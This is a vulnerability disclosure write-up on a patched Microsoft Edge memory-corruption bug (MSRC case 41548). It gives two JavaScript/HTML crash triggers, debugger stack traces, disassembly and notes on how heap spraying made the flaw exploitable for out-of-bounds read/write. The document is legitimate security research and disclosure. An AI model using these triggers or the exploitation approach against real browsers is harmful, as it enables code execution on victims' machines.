# Msrc Case 41548 - Microsoft Edge: multiple race conditions leading to rce.

this vulnerability was found fuzzing with a modified version of  <html> <a href="https://github.com/google/domato">domato</a></html>.

# Trigger

```javascript
var a1 = document.createElementNS("http://www.w3.org/2000/svg", "mpath");                   (1)                        
a1.style.setProperty("content", "var(--c)");                                                (2)                        
var a2 = a1.cloneNode();                                                                    (3)
```

1 -> has to be an mpath element any other will not crash the content provider.<br>
2 -> can be any variable, but if not set then the content provider will not crash.<br>
3 -> leads to use of uninitialized heap memory.<br><br>

minimal stack trace:<br>

```c
partial stack trace:

 # Child-SP          RetAddr           Call Site
00 00000050`e6bf6208 00007fff`7bccb940 msvcrt!memcpy+0x2e6
01 00000050`e6bf6210 00007fff`51b5a895 msvcrt!memcpy_s+0x60
02 00000050`e6bf6250 00007fff`51f5ea51 edgehtml!CStr::Set+0xa5
03 00000050`e6bf6290 00007fff`51ebac70 edgehtml!CGeneratedContentExpression::Copy+0x35
04 00000050`e6bf62d0 00007fff`51ca2b59 edgehtml!Tree::SpecifiedStyle::CopyPropertiesFrom+0x2180fc
05 00000050`e6bf6340 00007fff`51aa0c3e edgehtml!Tree::SpecifiedStyle::Clone+0x49
06 00000050`e6bf6370 00007fff`51be1872 edgehtml!CAttrValue::InitVariant+0x19e
07 00000050`e6bf63b0 00007fff`51be16d1 edgehtml!CAttrValue::Copy+0x66
08 00000050`e6bf6400 00007fff`51be1562 edgehtml!CAttrArray::Clone+0xf1
09 00000050`e6bf6480 00007fff`517df15e edgehtml!CElement::CloneAttributes+0x42
0a 00000050`e6bf64b0 00007fff`51c81ffe edgehtml!CSVGElement::CloneAttributes+0x1e
0b 00000050`e6bf6530 00007fff`51c62160 edgehtml!CElement::Clone+0x1de
0c 00000050`e6bf66f0 00007fff`51a87787 edgehtml!Tree::TreeWriter::CloneNode+0x80
0d 00000050`e6bf6730 00007fff`519cd476 edgehtml!CElement::CloneNodeHelper+0xa7
0e 00000050`e6bf6760 00007fff`519cd3ed edgehtml!CDOMNode::Var_cloneNode+0x5a
0f 00000050`e6bf6790 00007fff`51d11b45 edgehtml!CFastDOM::CNode::Trampoline_cloneNode+0x91
10 00000050`e6bf67f0 00007fff`511ee581 edgehtml!CFastDOM::CNode::Profiler_cloneNode+0x25
11 00000050`e6bf6820 00007fff`51226df6 chakra!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x1d1
12 00000050`e6bf68f0 00007fff`510f942c chakra!amd64_CallFunction+0x86
13 00000050`e6bf6940 00007fff`510fc368 chakra!Js::JavascriptFunction::CallFunction<1>+0x9c
14 00000050`e6bf69a0 00007fff`51102c99 chakra!Js::InterpreterStackFrame::OP_CallI<Js::OpLayoutDynamicProfile<Js::OpLayoutT_CallI<Js::LayoutSizePolicy<1> > > >+0xe8
15 00000050`e6bf69f0 00007fff`5110107c chakra!Js::InterpreterStackFrame::ProcessUnprofiledMediumLayoutPrefix+0x159
16 00000050`e6bf6a50 00007fff`51100f08 chakra!Js::InterpreterStackFrame::ProcessUnprofiled+0x8c
```

the crash was as follows:<br><br>

![](pics/curroption,,.PNG)

<br><br>
where the address of rax was taken from rcx who was pointing to heap memory. i have noticed that this is indeed the microsoftedgecp heap memory becouse i could sometimes spot left-overs of the page that redirected to that page. seeking to find exploitability assessment, i tried to see if this data is controllable, after some hours of debugging the application i could controll the register value (by heap spray, that i will blog about after i will finish fuzzing edge and then i wont need that technique anymore ..) who is later used to determine the length of a string to be allocated by the runtime. this leads to oob r/w.<br> 
# Find a Monkey to finish the exploit!

from my note's to msrc:<br><br>
"i think that the problem is that while the document still do not contain the new allocated object,<br>
we can still cast properties. that means that there is likly a problem with the constructor,<br>
who do not zero out non-existing fields, calling a clone on this object will lead to use of uninitialized variables."<br>

i have also found different code paths to the same issue that i have identified as a race condition leading to use-of-uninitialized memory (maybe this sample will help):<br>

```html
<script>
function trigger() {

// select the canvas object.
var a = canvas;

// point the element to the document itself (that is not yet contained at the page at the given time).
// so its actually free.
var uafObject = a.parentNode;

// create a new object from the freed object.
// that still points to the process heap (to the unloaded document).
var heapOverFlow = document.importNode(uafObject,true);

}
</script>
<body onload=trigger()>
<title id="junk" style=" content: var(--cssvard); grid-gap: none; border-left-color: ; orientation: auto" class="class7" loop="1" crossorigin="crossorigin" formmethod="post" cols="0" controls="controls"></title>
<canvas id="canvas" name="" hidden="hidden" dir="ltr" name="" width="0" low="1" placeholder="" onhashchange="" ontransitionend="" frame="BOX">
<font id="uafObject" title="" size="4" tabindex="4" dir="auto" title="W" usemap="" disposition="attachment" pluginspage="" preload="none" accept="image/*"></font>
</canvas>
</body>
```

```c
 # Child-SP          RetAddr           Call Site
00 0000001f`cbcfacb8 00007ffe`cec0b940 msvcrt!memcpy+0x2fa
01 0000001f`cbcfacc0 00007ffe`a56ce525 msvcrt!memcpy_s+0x60
02 0000001f`cbcfad00 00007ffe`a5b3e8b1 edgehtml!CStr::Set+0xa5
03 0000001f`cbcfad40 00007ffe`a5a9ac92 edgehtml!CGeneratedContentExpression::Copy+0x35
04 0000001f`cbcfad80 00007ffe`a5881d59 edgehtml!Tree::SpecifiedStyle::CopyPropertiesFrom+0x218f1e
05 0000001f`cbcfadf0 00007ffe`a567faae edgehtml!Tree::SpecifiedStyle::Clone+0x49
06 0000001f`cbcfae20 00007ffe`a57c01a2 edgehtml!CAttrValue::InitVariant+0x19e
07 0000001f`cbcfae60 00007ffe`a57c0001 edgehtml!CAttrValue::Copy+0x66
08 0000001f`cbcfaeb0 00007ffe`a57bfe92 edgehtml!CAttrArray::Clone+0xf1
09 0000001f`cbcfaf30 00007ffe`a5bc0bda edgehtml!CElement::CloneAttributes+0x42                            <-- CElement this time ..
0a 0000001f`cbcfaf60 00007ffe`a58610be edgehtml!CCommentElement::CloneAttributes+0x1a
0b 0000001f`cbcfaf90 00007ffe`a5840a00 edgehtml!CElement::Clone+0x1de
0c 0000001f`cbcfb150 00007ffe`a58408d8 edgehtml!Tree::TreeWriter::CloneNode+0x80
0d 0000001f`cbcfb190 00007ffe`a5667a5c edgehtml!Tree::TreeWriter::CloneNodeInternal+0xa4
0e 0000001f`cbcfb1e0 00007ffe`a5667be5 edgehtml!Tree::TreeWriter::CloneTreeInternal+0x134
0f 0000001f`cbcfb220 00007ffe`a5666518 edgehtml!Tree::TreeWriter::CloneTree+0x8d
10 0000001f`cbcfb2a0 00007ffe`a5bcf929 edgehtml!CElement::CloneNodeHelper+0x58
11 0000001f`cbcfb2d0 00007ffe`a5ca90d8 edgehtml!CDocument::importNode+0x89                                   <-- Our importNode.
12 0000001f`cbcfb320 00007ffe`a58f8df5 edgehtml!CFastDOM::CDocument::Trampoline_importNode+0xcc              (it's not a common api ..)
13 0000001f`cbcfb3e0 00007ffe`ba7ab491 edgehtml!CFastDOM::CDocument::Profiler_importNode+0x25
```

here are some graphics for the reader:<br><br>

![](pics/register.PNG)<br><br>


![](pics/aaa6.PNG)

# Fix
afaik this was patched in december pt.<br><br>

you can see that the CDocument is first initialized and only then gets cloned. by CElement::Clone<br> 
(see the above stack for a referance).

```assembly
0:019> kn
 # Child-SP          RetAddr           Call Site
00 00000009`8abf9040 00007ffe`a6a770a2 edgehtml!CAttrArray::Clone+0xf1
01 00000009`8abf90c0 00007ffe`a6ab058e edgehtml!CElement::CloneAttributes+0x42
02 00000009`8abf90f0 00007ffe`a6987f00 edgehtml!CElement::Clone+0x1de
03 00000009`8abf92b0 00007ffe`a6986ea0 edgehtml!Tree::TreeWriter::CloneNode+0x80
04 00000009`8abf92f0 00007ffe`a65f949a edgehtml!Tree::TreeWriter::CloneNodeInternal+0xa4
05 00000009`8abf9340 00007ffe`a65f9565 edgehtml!Tree::TreeWriter::CloneTreeInternal+0x1f2
06 00000009`8abf9380 00007ffe`a65f6e67 edgehtml!Tree::TreeWriter::CloneTree+0x8d
07 00000009`8abf9400 00007ffe`a6e1f159 edgehtml!CDocument::CloneNodeHelper+0x77
08 00000009`8abf9460 00007ffe`a6ef84b0 edgehtml!CDocument::importNode+0x89
09 00000009`8abf94b0 00007ffe`a6b48fe5 edgehtml!CFastDOM::CDocument::Trampoline_importNode+0xcc
0a 00000009`8abf9570 00007ffe`a60199f1 edgehtml!CFastDOM::CDocument::Profiler_importNode+0x25

0:019> u edgehtml!Tree::TreeWriter::CloneTreeInternal+0x1f2
edgehtml!Tree::TreeWriter::CloneTreeInternal+0x1f2:
00007ffe`a65f949a 488b5c2440      mov     rbx,qword ptr [rsp+40h]
00007ffe`a65f949f 488bd5          mov     rdx,rbp
00007ffe`a65f94a2 488bcb          mov     rcx,rbx
00007ffe`a65f94a5 e886493100      call    edgehtml!Tree::TreeWriter::AppendChildInternalConnection (00007ffe`a690de30)
00007ffe`a65f94aa 488bcd          mov     rcx,rbp
00007ffe`a65f94ad e82e193e00      call    edgehtml!Tree::ANode::TreeOwner (00007ffe`a69dade0)
00007ffe`a65f94b2 488bd0          mov     rdx,rax
00007ffe`a65f94b5 488bcb          mov     rcx,rbx
0:019> u edgehtml!Tree::TreeWriter::AppendChildInternalConnection
edgehtml!Tree::TreeWriter::AppendChildInternalConnection:
00007ffe`a690de30 4883ec28        sub     rsp,28h
00007ffe`a690de34 e877201800      call    edgehtml!Tree::ANode::PreviousSibling (00007ffe`a6a8feb0)
00007ffe`a690de39 4885c0          test    rax,rax
00007ffe`a690de3c 757b            jne     edgehtml!Tree::TreeWriter::AppendChildInternalConnection+0x89 (00007ffe`a690deb9)
00007ffe`a690de3e 48394140        cmp     qword ptr [rcx+40h],rax
00007ffe`a690de42 757b            jne     edgehtml!Tree::TreeWriter::AppendChildInternalConnection+0x8f (00007ffe`a690debf)
00007ffe`a690de44 e8c7c60c00      call    edgehtml!Tree::ANode::Parent (00007ffe`a69da510)
00007ffe`a690de49 4885c0          test    rax,rax
0:019> u edgehtml!Tree::ANode::Parent
edgehtml!Tree::ANode::Parent:
00007ffe`a69da510 8b4160          mov     eax,dword ptr [rcx+60h]
00007ffe`a69da513 2501000008      and     eax,8000001h
00007ffe`a69da518 3d01000008      cmp     eax,8000001h
00007ffe`a69da51d 7405            je      edgehtml!Tree::ANode::Parent+0x14 (00007ffe`a69da524)
00007ffe`a69da51f 488b4130        mov     rax,qword ptr [rcx+30h]
00007ffe`a69da523 c3              ret
00007ffe`a69da524 33c0            xor     eax,eax
00007ffe`a69da526 c3              ret



```

# TimeLine:

  * 17-10-2017 - vulnerability found
  * 17-10-2017 - vulnerability reported to vendor got initial triage (18).
  * 15-11-2017 - responded with acknowledgment of exploitability and a fix pursue by msrc.
  * 12-12-2017 - vulnerability fixed, got an email that it is not yet publicly available.
  


